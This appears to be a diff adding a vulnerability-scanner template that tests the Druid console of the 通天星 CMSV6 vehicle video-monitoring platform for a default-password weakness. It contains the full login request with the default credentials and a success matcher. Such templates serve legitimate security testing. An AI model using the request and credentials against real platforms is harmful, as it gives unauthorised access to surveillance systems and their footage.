@@ -1,0 +1,31 @@
+id: tongtianxing-druid-weakpass
+
+info:
+  name: tongtianxing-druid-weakpass
+  author: fitz
+  severity: medium
+  description: 通天星CMSV6车载视频监控平台druid存在默认口令漏洞
+
+  tags: Weak Password
+
+http:
+  - raw:
+    - |
+      POST /druid/submitLogin HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0
+      Accept: text/plain, */*; q=0.01
+      Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+      Accept-Encoding: gzip, deflate
+      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+      X-Requested-With: XMLHttpRequest
+      Content-Length: 42
+      Connection: close
+      Cookie: JSESSIONID=4F7D8A071EAC19E6196D1775D84D2F8D
+
+      loginUsername=ttx&loginPassword=ttx123456.
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code==200 && contains_all(body,"success")'
